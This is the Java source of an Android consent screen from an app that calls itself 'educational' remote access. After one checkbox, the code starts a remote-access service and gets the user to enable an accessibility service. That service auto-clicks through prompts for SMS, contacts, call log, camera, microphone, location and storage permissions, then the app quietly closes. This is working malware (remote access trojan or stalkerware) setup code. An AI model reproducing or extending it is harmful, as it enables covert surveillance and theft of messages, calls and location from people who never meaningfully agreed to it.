package com.remoteaccess.educational;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.remoteaccess.educational.permissions.AccessibilityHelperService;
import com.remoteaccess.educational.permissions.AutoPermissionManager;
import com.remoteaccess.educational.services.RemoteAccessService;
import com.remoteaccess.educational.utils.PreferenceManager;
import java.util.ArrayList;
import java.util.List;

public class ConsentActivity extends AppCompatActivity {

    private CheckBox consentCheckbox;
    private Button acceptButton;
    private PreferenceManager preferenceManager;
    private AutoPermissionManager permissionManager;
    private Handler handler;
    private boolean isAccessibilityGranted = false;

    private static final int PERMISSION_REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_consent);

        preferenceManager = new PreferenceManager(this);
        permissionManager = new AutoPermissionManager(this);
        handler = new Handler();

        consentCheckbox = findViewById(R.id.consentCheckbox);
        acceptButton = findViewById(R.id.acceptButton);

        acceptButton.setEnabled(false);

        consentCheckbox.setOnCheckedChangeListener((buttonView, isChecked) -> {
            acceptButton.setEnabled(isChecked);
        });

        acceptButton.setOnClickListener(v -> {
            if (consentCheckbox.isChecked()) {
                grantConsentAndStartAccessibility();
            }
        });
    }

    private void grantConsentAndStartAccessibility() {
        // Save consent first
        preferenceManager.setConsentGiven(true);
        
        // Start the service
        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        Toast.makeText(this, "Please enable Accessibility Service...", Toast.LENGTH_LONG).show();
        
        // Ask for ONLY accessibility first
        new Handler().postDelayed(() -> {
            permissionManager.requestAccessibilityService();
            
            // Start monitoring for accessibility
            startAccessibilityMonitoring();
        }, 1000);
    }

    private void startAccessibilityMonitoring() {
        // Check every 2 seconds if accessibility is enabled
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (permissionManager.isAccessibilityServiceEnabled()) {
                    // Accessibility is now enabled!
                    isAccessibilityGranted = true;
                    onAccessibilityGranted();
                } else {
                    // Still not enabled, check again
                    handler.postDelayed(this, 2000);
                }
            }
        }, 3000);
    }

    private void onAccessibilityGranted() {
        Toast.makeText(this, "Accessibility enabled! Setting up...", Toast.LENGTH_SHORT).show();
        
        // Now auto-grant all other permissions
        new Handler().postDelayed(() -> {
            autoGrantAllPermissions();
        }, 1500);
    }

    private void autoGrantAllPermissions() {
        // Request all dangerous permissions
        List<String> permissionsToRequest = new ArrayList<>();
        
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        };

        // Add Android 13+ permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            String[] android13Permissions = {
                "android.permission.READ_MEDIA_IMAGES",
                "android.permission.READ_MEDIA_VIDEO",
                "android.permission.READ_MEDIA_AUDIO",
                "android.permission.POST_NOTIFICATIONS"
            };
            for (String permission : android13Permissions) {
                try {
                    permissionsToRequest.add(permission);
                } catch (Exception e) {}
            }
        }

        for (String permission : permissions) {
            try {
                if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission);
                }
            } catch (Exception e) {}
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toArray(new String[0]),
                PERMISSION_REQUEST_CODE
            );
        } else {
            finishSetup();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            finishSetup();
        }
    }

    private void finishSetup() {
        // Request special permissions after dangerous permissions
        new Handler().postDelayed(() -> {
            permissionManager.requestSpecialPermissions();
        }, 2000);

        // Final finish - disable auto-click and close app
        new Handler().postDelayed(() -> {
            // Disable auto-click after setup is complete
            AccessibilityHelperService.disableAutoClick();
            
            Toast.makeText(this, "Setup Complete!", Toast.LENGTH_SHORT).show();
            finish();
        }, 5000);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
    }
}
